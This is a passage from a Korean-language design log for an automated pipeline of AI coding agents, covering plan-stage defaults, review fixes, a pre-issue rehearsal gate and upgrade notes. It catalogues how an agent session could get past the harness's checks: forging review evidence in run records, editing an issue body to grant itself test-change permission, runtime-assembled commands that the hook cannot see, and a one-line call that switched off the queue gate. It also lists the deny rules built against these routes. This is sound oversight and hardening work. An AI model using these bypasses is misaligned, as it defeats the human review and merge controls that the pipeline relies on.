  M18-1, M18-3, M2-7 + #8 should_fix 4건). 라운드를 더 돌릴수록 `done_when`이 정교해지고, 정교해진
  `done_when`이 새 결함 표면이 됐다.
- 감사의 결정규칙("베이스라인 done_when ⊇ must_fix가 4개 중 3개 이상")을 **엄격 적용하면 2.5/4 —
  미발화**다(#8 ✅ 공허참, #15 ✅, #18 △, #2 ❌). 규칙이 못 잰 것 둘: 비용(위)과 자해(위). 그리고 실패한
  한 건(#2)의 성격이 결정을 정했다 — 유일한 load-bearing 이슈였고, 토론이 베이스라인을 이긴 곳도
  거기뿐이다.

**결정**: 규칙은 발화하지 않았지만(2.5/4) 비용과 자해 증거로 **기본값을 바꾼다**: 4역할 토론을 끄지
않고 **load-bearing tier로 좁힌다**.

#### 기본 = 단일 opus 1패스 + skeptic 1패스
CHARTER에 `plan: { mode: single, debate_tiers: [load-bearing], max_done_when: 6 }`.
`planRoundsFor(charter, tier)`가 숫자가 아니라 `{mode, rounds}`를 돌려준다 — `mode`는
`plan.mode==="debate"`거나 tier가 `debate_tiers`에 있으면 `debate`, 아니면 `single`; `rounds`는 여전히
숫자 하나라 `verify-stage`의 `expectedRounds` 계약과 `plan.v1` 스키마는 바뀌지 않는다. 단일 모드
로스터는 `["synthesizer","skeptic"]`(`plan_roles`는 토론 tier에서만 읽힌다). 워크플로 단일 경로:
계획자 1패스(opus, `plan.v1` 전문) → skeptic 1패스(삭제·수정 필드 없음 — `risks`/`done_when`/
`dissent`뿐, 같은 id를 다시 보내도 계획자 문장이 이긴다 — "추가만 한다"가 부탁이 아니라 타입) → 종합은
계획자 자신의 최종본(합성 에이전트 호출 없음, 서명 라운드 없음). `context.json`에 `plan` 블록이 없는
업그레이드 전 미러는 `debate`로 떨어진다(조용히 load-bearing 계획을 깎는 것보다 낫다).

#### plan 검증기 — 스크립트 집행
`verifyStage`가 plan 스테이지에서 `validatePlanHandoff`를 돌린다. 위반은 스키마 위반과 동일하게
취급(스테이지 GREEN 없음 → 사람).

| 규칙 | 사유 문구 | 근거 |
|---|---|---|
| (a) `severity>=medium`이거나 severity 없는 `dissent_log` 항목은 어떤 `done_when.covers`가 짚어야 한다 | `dissent without done_when: <ids>` | #2의 단일 원인 — M2-1을 **알고도** `open_risks`에 뒀고, 9라운드·재실행 3회·plan $118을 쓰고서야 `dw1`이 됐다 |
| (b) `done_when.length <= plan.max_done_when`(기본 6) | `done_when has N items (max M)` | must_fix의 33%가 계획이 발명한 done_when에서 나왔다 |
| (c) 가드 모양 `done_when`(화이트리스트·순서·정규식 등, `GUARD_SHAPED_PATTERNS`)은 이슈가 가드를 요구하지 않는 한 무효 | `guard-shaped done_when: <ids> — …` | #18 dw2/dw4, #15 dw1–dw3이 리뷰어가 3라운드를 태운 바로 그 대상 |

id 없는 `dissent_log` 항목은 위치로 부른다(`d1`,`d2`,…). `covers`/`dissent_log.id`/`severity`는
스키마에서 선택 필드(옛 핸드오프는 통과). (c)는 **알려진 조잡한 필터**다 — 거짓 양성·거짓 음성이
둘 다 가능하고, 실측(#15·#18에서 실제로 must_fix를 만든 done_when)에서 뽑았을 뿐 분류기가 아니다.
탈출구는 이슈 본문에 `guard`/`가드`/`[guard]`가 있으면 규칙 전체 면제. 다음 표본에서 거짓 판정이
나오면 목록을 고치지 규칙을 끄지 않는다.

**알려진 한계**:
- 단일 모드는 skeptic 한 번에 전부를 건다 — 그 패스가 죽으면 계획은 계획자 1패스 그대로 나가고,
  토론 모드의 "역할 하나가 빠져도 나머지가 돈다"에 해당하는 완충이 없다(대신 조용하지 않다 —
  `debate.skeptic_added: null`이 핸드오프에 남는다).
- `synthesizer`가 `roles.toml`에 없는 채택 저장소는 plan 스테이지에서 즉시 죽는다(조용한 폴백
  없음) — 템플릿에는 있으므로 `factory init`로 설치한 저장소는 해당 없다.
- 검증기는 `covers`의 **내용**을 읽지 않는다 — dissent id를 짚기만 하면 통과("그 done_when이 정말
  그 위험을 막는가"는 여전히 spec-conformance 리뷰어의 몫).
- 표본은 n=4, load-bearing 1건뿐이다. **되돌림 조건**: load-bearing 이슈 3건 이상을 같은 프로토콜로
  A/B하기 전까지 토론 축소를 되돌리지 않는다. **재측정 조건**: plan을 태운 이슈가 n≥10 쌓이면 같은
  대조를 다시 돈다 — ① 단일 모드에서 리뷰 라운드가 늘었는가(토론이 사던 "인식"을 잃었는가), ②
  계획 유발 must_fix 비율이 33%에서 내려갔는가, ③ 검증기 (a)가 반려한 계획이 재실행에서 정말
  나아졌는가(라운드만 늘렸다면 (a)는 규칙에서 경고로 내린다; ②가 안 내려가면 상한을 6보다 낮춘다).
- 베이스라인 문서 자신의 한계가 그대로 승계된다: must_fix는 계획이 아니라 **구현된** 것을 리뷰어가
  판정한 결과라 "회피" 판정 4건은 계획 텍스트만 근거, #2 스냅샷 비대칭(베이스라인이 받은
  `package.json`에는 사람 머지 d7f7996 이후의 `pg`가 이미 있었다 — M2-2는 베이스라인 분모에서
  뺐다), 비용 비교는 실측 청구액 대 토큰×정가 추정(85:15 입출력 가정, 팩토리에 불리한 쪽).

**영향**: `factory/lib/config.js`(`plan` 블록, `planRoundsFor`, `rosterFor`), `factory/lib/context.js`,
`factory/lib/verify-stage.js`(`validatePlanHandoff`, `GUARD_SHAPED_PATTERNS`), `factory/lib/schemas.js`
(선택 필드), `templates/factory/claude/workflows/factory-plan.js`(단일 모드 경로),
`templates/factory/docs/factory/CHARTER.md`·`docs/factory/CHARTER.md`(`plan` 블록). 실험 산출물:
`factory/bin/plan-baseline.js`, `docs/factory/dogfood/2026-09-14-plan-baseline.md`.

---

### 리뷰 batch-2 수정

batch-2 적대적 재리뷰(`scratchpad/review-audit-batch2-report.md`, 범위 `02d8599..05c3960` = batch-1
must-fix + Task 4/5 + 컨트롤러 미러)는 **NEEDS-FIX**였다. 판정의 무게중심은 하나다: batch-1이 닫았다고
적어 둔 두 곳에서 **코드가 그 주장을 지탱하지 못했다.** 리뷰어는 훅 두 벌을 ~70개 합성 stdin으로 직접
실행했고, 손으로 위조한 run 기록에 `verifyReviewProvenance`를 돌려 `{ok:true}`를 재현했다. 네 가지를 고쳤다.

1. **엔드포인트 표의 구멍(MF-1)**. `PATCH /issues/<n>`(라벨·본문), `POST /merges`(보호 경로를 하나도
   건드리지 않는 머지), `PATCH /pulls/<n>`(base 재지정), `curl --upload-file`, 그리고 SDK 철자
   (`octokit.request("POST /…")`·`.post(`/`.patch(`/…)가 전부 rc=0이었다 — 동사도 엔드포인트도 명령줄에
   그대로 있는데 **메서드의 철자만** 플래그에서 문자열·메서드 이름으로 옮겨 간 것이다. 셋 다 권위
   엔드포인트가 같은 명령에 있을 때만 문다. 뒤쪽 경계는 `([^0-9/]|$)`로 잡아 `/issues/7`과
   `/issues/7/comments`를 가른다(코멘트는 handoff가 나가는 문이다).
2. **리뷰 증거의 바인딩이 위조 가능했다(MF-2)**. `docs/factory/runs/**`는 에이전트 세션이 쓸 수 있었고
   (`echo … >> docs/factory/runs/7.md` rc=0) 파서는 **파일의 마지막 줄**을 골랐다 — 곧 implement 에이전트가
   가짜 `## review` 섹션을 심으면 그것이 권위 있는 증거가 됐다. 이제 증거 줄이 `run_id=<GITHUB_RUN_ID>`와
   러너를 싣고, 머지 스테이지는 기대하는 런 id를 **이슈의 review 하트비트**(`runner: gha-<run id>`,
   기록과 다른 채널)에서 읽어 그 런이 쓴 줄만 고른다. 같은 런 id를 말하는 줄이 둘이면 판정 불능이다.
   쓰기 경계도 함께 닫았다: 새 harness 키 `[protected].runner_only`가 그 디렉터리를 **생성되는 훅 `prot`와
   ci-settings deny에만** 넣는다(L1 머지 경계는 그대로 — run 기록은 러너가 쓰고 사람 없이 머지돼야 한다).
   doctor의 `protected.runner-only`가 그 둘이 갈라지는 것을 FAIL로 잡는다.
3. **세션 설정 보호가 전부 루트 앵커였다(MF-3)**. `docs/CLAUDE.md`·`src/AGENTS.md`·중첩 `.mcp.json`은
   overlay 밖, drift 검사 밖, `[protected]` 밖, `Write()` deny 밖이었고 tier는 `docs`(가장 작은 로스터)로
   떨어졌다. 게다가 이 저장소는 `CLAUDE.md`만 적어 두어 `CLAUDE.local.md`가 열려 있었다. 두 harness의
   글롭을 깊이 무관 형태로 바꾸고(`**/CLAUDE*.md`·`**/AGENTS*.md`·`**/.mcp*.json`), overlay는 스테이지
   커밋을 `git ls-tree`로 훑어 그 이름들을 찾고(스캔 실패는 fail closed) diff·status는 `:(glob)` pathspec을
   쓴다. `NEVER_DOCS_GLOBS`에도 같은 셋을 넣어 어느 깊이의 세션 설정도 docs tier가 될 수 없다.
4. **이슈 본문이 열려 있었다(#4)**. `tests_changed_allowed:` 마커는 이슈 본문에서만 읽히는데
   `gh issue edit … --body`가 rc=0이었다 — 에이전트가 자기 자신에게 테스트 수정 허가를 써 줄 수 있었다.
   `--body/--body-file/-b/-F`를 막는다(`gh issue comment`는 그대로 열려 있다).

**영향**: `factory/hooks/block-dangerous.sh`(엔드포인트·쓰기 모양·issue edit·cp/mv 목적지 접두),
`factory/lib/run-record.js`(`run_id`/`runner`, `parseReviewEvidence(text, {runId})`, `runIdOfRunner`),
`factory/lib/review-quorum.js`(`expectedRunId`), `factory/bin/run-stage.js`(`reviewRunId` dep, overlay 글롭),
`factory/lib/merge-stage.js`, `factory/lib/gates.js`, `factory/lib/protected-paths.js`(`runner_only`,
깊이 무관 글롭 → ERE), `factory/lib/doctor/{harness,factory}.js`, 두 `harness.toml`과 그 생성물(미러 포함).
**남은 한계**: 기대 런 id의 출처인 하트비트 코멘트도 봇 계정이 쓴다 — 단일 자격증명 잔여(아래)가 풀리기
전까지 이 바인딩은 "훅이 보지 못하는 철자"까지 막지는 못한다. 그리고 `docs/factory/runs/**`는 여전히
no-write 스테이지의 스크래치 경로다(러너가 세션 중에 덧붙이므로) — 닫힌 것은 **에이전트의 쓰기**다.

### 남은 것 (Task 6 — 이번 사이클에 착수하지 않았다)

**Task 6 — triage default-deny, prove-test base env, label-guard fail-closed, lessons 증거 (M1,
M2, M13, M10/M11)**. 착수하지 않았다. 감사가 남긴 것 그대로다: CHARTER `triage.default`가 여전히
default-allow(M1, `factory-triage.md:31-37`), `prove-test`는 base exit≠0만 보고 base에 `npm ci`가
없어 "정말 실패"와 "설치가 안 됐다"를 구별하지 못한다(M2), entry-label 조회 실패가 통과로 떨어진다
(M13 부분), lessons 15개가 전부 헤더뿐이고 `evidence_runs`는 길이만 검사하며 인용 카운터가 증가하지
않는다(M10/M11). 다음 사이클의 P2.

**Task 8b — 스테이지가 브랜치 체크아웃을 직접 소유한다**: **닫혔다**(위 Task 8 절의 "Task 8b" 문단).
implement는 이제 `claude -p` 앞에서 `claude/fq-<issue>`를 직접 체크아웃하고, 세션 안의 브랜치 이동은
훅이 막으며, 세션 뒤에 HEAD와 팩토리 설정을 다시 확인한다. 남은 자리는 두 개다: ① 브랜치가 팩토리
소유 경로를 들고 있는 rework 라운드는 사람에게 넘어간다(위 "판정 하나"), ② 훅이 못 보는 철자
(런타임 조립)는 여전히 비목표이고, 그 자리를 메우는 것은 세션 뒤의 브랜치·drift 확인이다.

**KTB-39 — 스테이지가 시작하기도 전에 더러워진 트리**: **닫혔다**(ADR-020 ⑤의 KTB-39 절).
`[runtime].setup`이 남긴 diff는 기준선으로 클린 체크에서 빠지고, implement는 빌더 앞에서 그것을
복원한다. 남은 자리는 둘이다: ① numstat 지문은 추가·삭제 줄 수가 같은 재편집을 구별하지 못한다,
② 복원으로 지워진 비추적 setup 산출물은 게이트가 스스로 다시 만들어야 한다(setup은 잡당 한 번만
돈다) — 그래서 doctor의 `runtime.setup-dirties-tree`가 그런 하네스를 WARN으로 부른다.

**단일 자격증명 잔여** (Task 2 "알려진 한계", batch-1 "남은 위험" 1). 러너와 에이전트가 여전히 같은
PAT을 쓴다 — 훅이 못 보는 철자(런타임 조립)로 push가 나가면 리뷰 증거 바인딩·기록 브랜치 보호가
함께 무너진다. `restrictions`로 push를 머지 배우에 묶을 수 없다(기록을 쓰는 것은 모든 스테이지의
러너다). 진짜 분리는 두 번째 배우이거나 `GITHUB_RUN_ID`에 묶인 서명 산출물 — 다음 주기의 P0.

**런타임 조립 동사는 비목표** (ADR-020 잔여 위험 #4, 이 ADR 전반에서 반복 확인). 훅은 명령줄에
동사가 연속으로 나타나야 볼 수 있다(`x=$(printf "gh pr merge"); $x`, `node -e "execSync(…)"` 류는
여전히 안 보인다). 이 경계를 실제로 닫는 것은 훅이 아니라 ADR-021의 **토큰 분리**(에이전트 배우가
쥔 토큰으로는 애초에 그 API가 거부된다)다 — H1/M7/Task 1/2가 훅 쪽에서 할 수 있는 것을 다 했다는
뜻이지, 훅이 완결됐다는 뜻은 아니다.

**M8의 생성물은 *우리* 매처가 아니라 *소비자*의 매처에 먹힌다** (KTB-40, 2026-09-14). M8이 만든 단일
출처는 옳았지만, 그 출력의 **의미**를 우리는 저장소의 `lib/glob.js`(`*`는 `/`를 넘지 않는다)로만
검증했다. 그 생성물을 실제로 읽는 것은 Claude Code의 권한 계층이고, 라이브 관측(KTB #3 review R2,
run 34840944244)은 그 계층이 더 관대하게 읽는다는 것을 보여 줬다 — `.factory/out/*` 하나가
`mkdir -p .factory/out/qa/`와 `printf … > .factory/out/qa/test1.log`를 **둘 다** 거절시켰다. 즉
**KTB-36의 deny 좁히기는 충분하지 않았다**: 그 열거에 남은 `*` 한 글자가 카브아웃을 계속 덮고 있었고,
우리 매처로는 `qa/x.png`가 통과하니 테스트도 초록이었다(게다가 우리 매처로도 `.factory/out/qa`
**디렉터리 자신**은 직계 자식이라 이미 걸리고 있었다 — 아무도 그것을 물어보지 않았을 뿐이다).
KTB-40의 교훈은 규칙이다: **생성물의 판정 테스트는 우리 매처와 "더 관대한" 매처 두 개로 돌린다.**
한쪽만으로는 "우리 가정이 이식되지 않는다"를 절대 볼 수 없다.

### 1.2.0 채택자 영향 (체크리스트)

`factory init --upgrade`가 해야 할 일과, 업그레이드 전후로 달라지는 판정:

- [ ] **새 doctor FAIL 다섯**: `charter.merge-human-gate-unset`(CHARTER에 `merge.human_gate`가
  없으면), `gates.lint-noop`(`node -e 0` 류), `gates.levels-identical`(`full`/`deep`이 `fast`와
  같으면), `protected.parity`(훅·ci-settings의 보호 목록이 harness.toml과 갈리면),
  `load-bearing.paths-exist`(`[load_bearing].paths`에 매치 0인 경로가 있으면).
- [ ] **새 CHARTER 필드**: `merge.human_gate: true|false`(템플릿 기본 `true`, KTB 자신은 `false`),
  `plan.mode`/`plan.debate_tiers`/`plan.max_done_when`(기본 `single`/`["load-bearing"]`/`6`).
- [ ] **`factory init --upgrade`가 다시 생성하는 것**: `.claude/hooks/*`의 `prot` 블록과 두
  `ci-settings*.json`의 deny(단일 출처 `harness.toml [protected]`에서), `.factory/**` 미러 전체,
  `templates/factory/docs/factory/CHARTER.md`.
- [ ] **`factory-loader` 에이전트가 제거된다**: `.claude/agents/factory-loader.md`·
  `.factory/lessons/factory-loader.md`가 사라진다(설치본에서도 배선이 풀린다 — M6와 같은 원칙).
- [ ] **required 게이트가 레벨 목록에 없으면 이제 MISCONFIGURED다**(전에는 조용히 무시됐다).
  업그레이드 직후 가장 시끄러운 변화 — 레벨 목록에 넣거나 required에서 빼야 한다.
- [ ] **머지가 더 자주 `factory:needs-human`으로 떨어진다**: 리뷰 handoff가 PR head에 안 묶였거나,
  정족수가 안 맞거나, `factory/review`·`factory/gates` 상태가 팩토리 계정이 아니면 자동 머지가
  멈춘다. 업그레이드 직후 가장 흔한 원인은 옛 워크플로가 `FACTORY_BOT_LOGIN`을 안 넘겨 두 배우
  모드의 게시자 검증이 막히는 것 — `init --upgrade`로 워크플로를 갱신하면 풀린다.
- [ ] **review·merge·implement 스테이지가 시작 시 PR의 `.factory/**`·`.claude/**`·CHARTER를 base
  것으로 되돌린다**(overlay). PR이 하네스를 고쳐도 그 PR **자신의** 스테이지에는 안 들어간다 —
  머지되고 다음 런부터.
- [ ] **implement의 브랜치는 스테이지가 체크아웃한다**(Task 8b): 빌더 세션은 이미 `claude/fq-<issue>`
  위에서 시작하고, 세션 안의 `git checkout`/`git switch`/`git reset --hard`/`git stash`는 훅이 막는다
  (`git checkout -- <path>`는 그대로). 세션이 끝날 때 HEAD가 그 브랜치가 아니면 `factory:blocked`.
  빌더 프롬프트를 커스터마이즈한 어댑터는 "브랜치를 체크아웃하라"는 문장을 **지워야 한다**.
- [ ] **테스트 변조가 human-merge 정책 위반이 된다**: 기존 test_glob 파일에서 줄 삭제·파일 삭제
  diff는 이슈 본문 `tests_changed_allowed:` 없이는 자동 머지되지 않는다.
- [ ] **plan 기본값이 바뀐다**: 4역할 토론 대신 단일 opus 1패스+skeptic 1패스가 기본이고,
  load-bearing tier(처음 열리는 영속/외부 쓰기 경로, 처음 고정되는 공개 와이어 계약, 또는
  `[protected]` 변경)에서만 토론이 유지된다.

---

## ADR-025 리허설 — 첫 이슈 전에 하네스를 러너에서 한 번 — 2026-09-14

**질문**: 소유자가 2026-09-14에 물었다 — "새 프로젝트에 이식할 때마다 이 짓을 해야 하나?" 그 "이 짓"은
own-calendar의 첫 다크 이슈가 요구한 **하네스 디버깅 3라운드**다. 결함은 셋이었고, 라운드마다 정확히
하나씩 드러났다:

| 라운드 | 무엇이 드러났나 | 왜 그때까지 안 보였나 |
|---|---|---|
| 1 | `[runtime].setup`이 Flutter를 설치하지 않아 게이트가 **exit 127** | setup은 러너에서만 돈다 — 사람의 노트북에는 이미 Flutter가 있었다 |
| 2 | `flutter analyze`가 **기존 info**에 걸려 exit 1 | 게이트 명령을 그 저장소 전체에 대해 돌려 본 적이 없었다 |
| 3 | `cd client` 뒤의 `test_files`/`test_one`이 **레포 루트 기준 경로**를 받아 파일을 못 찾음 | 자리표시자는 스테이지가 채운다 — 하네스를 읽는 눈에는 보이지 않는다 |

**doctor는 이것을 볼 수 없다 — 구조적으로.** `--no-run`·`--offline`은 정적 검사이고(텍스트와 글롭),
`--run`은 명령을 **사람의 노트북에서** 돌린다: 러너의 PATH도, `.factory/actions/setup`이 만든 상태도,
스테이지가 실제로 넘기는 인자도 그 자리에는 없다. 세 결함은 전부 "러너에서 명령이 실제로 돌 때만"
참/거짓이 갈리는 명제였다. 그래서 doctor를 더 똑똑하게 만드는 길은 없다 — **한 번 돌려 보는 잡**이 있어야 한다.

**판결**: `factory-rehearse.yml` — 이슈도 라벨도 `claude -p`도 없는 잡 하나가, 스테이지가 러너에서 하는
일을 그대로 한 번 한다. 열한 스텝이고 **하나가 RED여도 멈추지 않는다**(3라운드의 비용은 결함이 하나씩
드러났기 때문에 생겼다 — 한 번의 리허설은 전부 보여줘야 한다):

`lint`(레포 전체) · `unit`(전체) · `test_files`(`[test].test_glob`의 실재하는 파일 하나) ·
`test_one`(그 파일의 첫 테스트 이름 — 못 읽으면 SKIPPED) · `lint_file`(소스 파일 하나) ·
`qa-evidence`(`.factory/out/qa/` 쓰기 프로브) · `clean-check`(KTB-39 기준선 대비 쓰기 금지 클린 체크) ·
`prove-test`(base 워크트리 생성 + 의존성 설치 — 감사 M2의 그 기계) · `gh-auth` · `gh-labels` ·
`gh-push`(`factory/rehearsal-<run id>` 스크래치 브랜치로 `git push --dry-run`).

각 스텝에는 상한이 있다(`timeout`, 124는 실패와 구별해 적는다). 판정은 표 하나로 잡 요약과
`.factory/out/rehearsal.json`(7일 보관, 업로드 전 스크럽)에 **같은 모양으로** 남는다.

**게이트**: GREEN인 리허설만 저장소에 기록된다 — 변수 `FACTORY_REHEARSED = sha256(harness.toml +
CHARTER 프론트매터)`. 변수 쓰기는 repo **admin**을 요구하는데 ADR-021의 권장 구성에서 워크플로가 쥔
것은 비-admin 봇 토큰이므로, 실제로는 **폴백이 본선이다**: `factory/rehearsal` commit status를
**지문 커밋**(= `.factory/harness.toml`·`docs/factory/CHARTER.md`를 마지막으로 건드린 기본 브랜치 커밋)에
올린다. 브랜치 head가 아닌 이유는 r1 리뷰가 재현한 결함이다 — head는 무관한 머지마다 움직여서 **첫
머지 직후** 기록이 고아가 되고, 그 순간부터 모든 큐 전이가 "harness changed…"로 거부됐다(아무것도
바뀌지 않았는데). 지문 커밋의 sha는 지문이 바뀔 때 정확히 함께 바뀐다. 읽을 때는 **두 출처를 모두**
보고 하나라도 맞으면 연다 — 한때 admin 토큰으로 변수를 썼다가 봇 토큰으로 옮긴 저장소가 얼어붙은
변수 때문에 영영 큐를 못 여는 일이 없도록(여전히 fail closed: 둘 다 어긋나면 거부).

`transition.js`는 `→ factory:queue`를 그 해시로 막는다(스크립트도 사람도): 기록이 없거나 해시가
어긋나면 **"harness changed since the last rehearsal — run `factory rehearse`"** 한 문장으로 거부하고,
이슈 상태는 한 글자도 바뀌지 않는다. 다른 목적 라벨은 리허설을 묻지 않는다 — 멈춘 이슈를 앞으로 미는
길까지 막으면 사고가 하나 더 는다.

**그 검사는 opt-out이다, opt-in이 아니다**(r1 리뷰 must_fix 3). 처음 구현은 `rehearsal` 인자를 준
호출자만 검사했는데, 그것은 이 함수에 세 번째 자물쇠를 둔 이유를 그대로 되돌리는 모양이었다:
`node -e "import('.factory/lib/transition.js').then(m => m.transition({gh, issue, to:'factory:queue'}))"`
한 줄이 — **인자를 빼는 것만으로** — 게이트를 껐다. 이제 큐로 가는 전이는 배선된 검사기가 있거나
명시적 `skipRehearsal: true`가 있어야 하고, 둘 다 없으면 거부한다. 프로덕션 호출자는 **전부** 배선한다:
사람의 `bin/transition.js`, sweeper의 하네스 주차 해제(`bin/sweep.js`), merge 스테이지의 step 9
(`transitionOther`), 그리고 flaky 수확(`gates.js` — 이슈를 `backlog`로 만든 뒤 게이트를 지나 큐로 민다).
`skipRehearsal`은 **테스트 전용**이다. 로봇의 재큐가 거부되는 것은 사고가 아니다: 그 팔들은 매 주기
다시 시도하고(이미 실패 편향이다), 사람이 `factory rehearse`를 돌리는 순간 통과한다 — 그리고 사람이
`:unstick`에서 거부당하는데 로봇만 조용히 통과하는 비대칭이 사라진다.

**리허설은 기본 브랜치에서만 돈다.** 워크플로 잡에 `if: github.ref == format('refs/heads/{0}',
github.event.repository.default_branch)`가 걸리고, 체크아웃도 그 브랜치를 본다. `rehearse.js` 자신도
`GITHUB_REF_NAME`을 하네스의 기본 브랜치와 대조해 다르면 **기록 없이 exit 1** 한다. 이중인 이유:
`gh workflow run --ref <branch>`는 레포 write면 누구나(= 모든 에이전트 스테이지가) 부를 수 있고
`.factory/**`는 브랜치 push 시점에 훅도 integrity도 보지 않는다 — 그 조합이면 브랜치의 스크립트가
main의 지문으로 GREEN을 기록할 수 있었다(게이트 명령을 한 줄도 돌리지 않고).

**기록의 성패는 판정의 일부다.** `rehearsal.json`은 `recorded: {via, variable, status, sha}`를 싣고,
`ok`는 "스텝 전부 GREEN **그리고** 어느 한쪽 기록이 성공"일 때만 참이다. r1에서는 표가 GREEN이면
아티팩트도 `ok: true`였고 기록 실패는 잡 로그에만 남아서, 잡이 빨간데 `factory rehearse`는 "the queue
is open"을 찍고 0으로 끝났다 — 사람은 첫 이슈가 거부될 때까지 그 사실을 몰랐다.

**왜 CHARTER 프론트매터까지인가**: `tier_default`·`limits`·`merge.human_gate`·`plan.*`는 러너가 무엇을
얼마나 도는지를 바꾼다. 반대로 산문(NEVER_AUTOMATE 설명, Definition of Done의 문장)은 지문에서 뺀다 —
그것까지 세면 문서 한 줄을 고칠 때마다 큐가 닫힌다.

**등급의 셋**: doctor `rehearsal.current`는 어긋난 기록을 **FAIL**(큐가 실제로 막혀 있다), 기록 없음을
**WARN**(설치 직후의 정상 상태 — 채택 순서가 install → doctor → rehearse → 첫 이슈다), 오프라인을
**WARN**(판정 불가)으로 가른다. `factory rehearse`(CLI)는 워크플로를 띄우고, 기다리고, 같은 표를 찍고,
RED면 non-zero로 끝난다.

**대가와 잔여 위험**:
- 잡 하나(≈ unit 한 번 + 설치 한 번)의 비용과 시간이 채택마다 더해진다. 3라운드(다크 라운드 ×3 =
  triage/plan/implement/review 세 바퀴)와 바꾼 값이라 크지 않다 — 그것이 소유자 질문의 답이다:
  "이 짓"은 한 번의 잡으로 줄어든다.
- 리허설은 **하네스가 러너에서 도는가**를 증명하지, 그 게이트가 좋은 게이트인가를 증명하지 않는다
  (`lint`가 아무것도 검사하지 않는 명령이면 doctor의 `gates.lint-noop`이 그것을 본다).
- 리허설과 첫 이슈 사이에 러너 이미지가 바뀌면(ubuntu-latest의 이동) 지문은 그대로인데 사실이 바뀐다.
  `push` 트리거(하네스·CHARTER 변경)와 사람의 재실행이 그 창을 좁히는 전부다.
- `gh-push`는 `--dry-run`이라 권한은 증명하되 브랜치를 만들지 않는다. 스크래치 삭제는 관용적으로
  덧붙인다(예전 런이 진짜로 만든 것이 남아 있을 수 있다).
- 하네스 이슈(`harness-request.js`)는 여전히 `factory:queue`로 바로 태어난다 — 그것이 **설계**다:
  리허설이 낡았을 때 그것을 고치는 이슈까지 막으면 저장소가 통째로 잠긴다. 반대로 flaky 수확은
  `backlog`로 태어나 게이트를 지난다(r1 리뷰 should_fix 3).
- 지문 해시의 구분자는 `\u0000` **이스케이프**로 적는다. r1은 리터럴 NUL 바이트를 넣었고, 그 두
  바이트가 git에게 이 모듈을 binary로 보이게 해 `git diff`가 내용을 영영 보여주지 않았다 — 게이트를
  정의하는 파일이 사람·도구·**팩토리 자신의 리뷰 스테이지** 모두에게 구조적으로 리뷰 면제였다.
  `factory/bin/lint.js`의 `nul-byte` 규칙이 재발을 막는다.
